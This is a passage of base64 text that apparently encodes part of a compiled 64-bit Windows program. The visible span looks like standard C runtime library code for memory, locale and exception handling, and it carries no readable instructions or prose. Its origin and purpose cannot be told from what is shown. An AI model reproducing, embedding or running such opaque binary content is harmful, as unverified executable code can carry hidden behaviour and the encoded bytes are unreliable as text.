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wKCEyLFAr/yEwPw0kITA/DEXWqSYHoABAAAEmB+AAQAAAPg3H////wgAwkAOm6/v//SIXJD4TkAwAAU0iD7CBIi9lIi0kI6PrJ//9Ii0sQ6PHJ//9Ii0sY6OjJ//9Ii0sg6N/J//9Ii0so6NbJ//9Ii0sw6M3J//9Iiwvoxcn//0iLS0DovMn//0iLS0jos8n//0iLS1Doqsn//0iLS1joocn//0iLS2DomMn//0iLS2joj8n//0iLSzjohsn//0iLS3Dofcn//0iLS3jodMn//0iLi4AAAADoaMn//0iLi4gAAADoXMn//0iLi5AAAADoUMn//0iLi5gAAADoRMn//0iLi6AAAADoOMn//0iLi6gAAADoLMn//0iLi7AAAADoIMn//0iLi7gAAADoFMn//0iLi8AAAADoCMn//0iLi8gAAADo/Mj//0iLi9AAAADo8Mj//0iLi9gAAADo5Mj//0iLi+AAAADo2Mj//0iLi+gAAADozMj//0iLi/AAAADowMj//0iLi/gAAADotMj//0iLiwABAADoqMj//0iLiwgBAADonMj//0iLixABAADokMj//0iLixgBAADohMj//0iLiyABAADoeMj//0iLiygBAADobMj//0iLizABAADoYMj//0iLizgBAADoVMj//0iLi0ABAADoSMj//0iLi0gBAADoPMj//0iLi1ABAADoMMj//0iLi3ABAADoJMj//0iLi3gBAADoGMj//0iLi4ABAADoDMj//0iLi4gBAADoAMj//0iLi5ABAADo9Mf//0iLi5gBAADo6Mf//0iLi2gBAADo3Mf//0iLi6gBAADo0Mf//0iLi7ABAADoxMf//0iLi7gBAADouMf//0iLi8ABAADorMf//0iLi8gBAADooMf//0iLi9ABAADolMf//0iLi6ABAADoiMf//0iLi9gBAADofMf//0iLi+ABAADocMf//0iLi+gBAADoZMf//0iLi/ABAADoWMf//0iLi/gBAADoTMf//0iLiwACAADoQMf//0iLiwgCAADoNMf//0iLixACAADoKMf//0iLixgCAADoHMf//0iLiyACAADoEMf//0iLiygCAADoBMf//0iLizACAADo+Mb//0iLizgCAADo7Mb//0iLi0ACAADo4Mb//0iLi0gCAADo1Mb//0iLi1ACAADoyMb//0iLi1gCAADovMb//0iLi2ACAADosMb//0iLi2gCAADopMb//0iLi3ACAADomMb//0iLi3gCAADojMb//0iLi4ACAADogMb//0iLi4gCAADodMb//0iLi5ACAADoaMb//0iLi5gCAADoXMb//0iLi6ACAADoUMb//0iLi6gCAADoRMb//0iLi7ACAADoOMb//0iLi7gCAADoLMb//0iDxCBbw8zMSIXJdGZTSIPsIEiL2UiLCUg7DXVoAAB0BegGxv//SItLCEg7DWtoAAB0Bej0xf//SItLEEg7DWFoAAB0Bejixf//SItLWEg7DZdoAAB0BejQxf//SItLYEg7DY1oAAB0Bei+xf//SIPEIFvDSIXJD4QAAQAAU0iD7CBIi9lIi0kYSDsNHGgAAHQF6JXF//9Ii0sgSDsNEmgAAHQF6IPF//9Ii0soSDsNCGgAAHQF6HHF//9Ii0swSDsN/mcAAHQF6F/F//9Ii0s4SDsN9GcAAHQF6E3F//9Ii0tASDsN6mcAAHQF6DvF//9Ii0tISDsN4GcAAHQF6CnF//9Ii0toSDsN7mcAAHQF6BfF//9Ii0twSDsN5GcAAHQF6AXF//9Ii0t4SDsN2mcAAHQF6PPE//9Ii4uAAAAASDsNzWcAAHQF6N7E//9Ii4uIAAAASDsNwGcAAHQF6MnE//9Ii4uQAAAASDsNs2cAAHQF6LTE//9Ig8QgW8PMzMzMzMzMzMzMzMxmZg8fhAAAAAAASIvBSYP4CHJTD7bSSbkBAQEBAQEBAUkPr9FJg/hAch5I99mD4Qd0BkwrwUiJEEgDyE2LyEmD4D9JwekGdTlNi8hJg+AHScHpA3QRZmZmkJBIiRFIg8EISf/JdfRNhcB0CogRSP/BSf/IdfbDDx9AAGZmZpBmZpBJgfkAHAAAczBIiRFIiVEISIlREEiDwUBIiVHYSIlR4En/yUiJUehIiVHwSIlR+HXY65RmDx9EAABID8MRSA/DUQhID8NREEiDwUBID8NR2EgPw1HgSf/JSA/DUehID8NR8EgPw1H4ddDwgAwkAOlU////zMxAU0iD7CBFixhIi9pMi8lBg+P4QfYABEyL0XQTQYtACE1jUAT32EwD0UhjyEwj0Uljw0qLFBBIi0MQi0gISANLCPZBAw90DA+2QQOD4PBImEwDyEwzykmLyUiDxCBb6YG4///MSIPsKE2LQThIi8pJi9Hoif///7gBAAAASIPEKMPMzMxAVUFUQVVBVkFXSIPsUEiNbCRASIldQEiJdUhIiX1QSIsFClcAAEgzxUiJRQiLXWAz/02L8UWL+IlVAIXbfipEi9NJi8FB/8pAODh0DEj/wEWF0nXwQYPK/4vDQSvC/8g7w41YAXwCi9hEi2V4i/dFheR1B0iLAUSLYAT3nYAAAABEi8tNi8Yb0kGLzIl8JCiD4ghIiXwkIP/C/xWAGAAATGPohcB1BzPA6fYBAABJuPD///////8PhcB+XjPSSI1C4En39UiD+AJyT0uNTC0QSIH5AAQAAHcqSI1BD0g7wXcDSYvAS